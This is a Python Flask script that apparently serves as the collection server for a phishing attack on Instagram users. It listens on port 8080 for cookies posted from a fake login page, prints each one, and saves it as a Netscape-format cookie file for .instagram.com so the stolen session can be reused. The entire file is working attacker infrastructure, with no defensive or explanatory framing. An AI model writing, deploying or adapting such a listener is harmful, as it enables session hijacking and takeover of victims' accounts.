from flask import Flask, request
import os

app = Flask(__name__)
os.makedirs("sessions", exist_ok=True)

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json(force=True)
        cookie_str = data.get("cookie", "").strip()

        if not cookie_str:
            print("[⚠️] No cookie received!")
            return '', 204

        print("\n[🍪 Cookie Captured from Login Page]")
        print(cookie_str)

        with open("sessions/fake_ig_session.cookies.txt", "w") as f:
            f.write("# Netscape HTTP Cookie File\n")
            for part in cookie_str.split(";"):
                if "=" in part:
                    k, v = part.strip().split("=", 1)
                    f.write(f".instagram.com\tTRUE\t/\tFALSE\t0\t{k}\t{v}\n")

        print("[💾] Saved to sessions/fake_ig_session.cookies.txt")
    except Exception as e:
        print(f"[!] Error: {e}")
    return '', 204

if __name__ == '__main__':
    print("[🎯] Cookie listener live at http://0.0.0.0:8080/capture")
    app.run(host="0.0.0.0", port=8080)
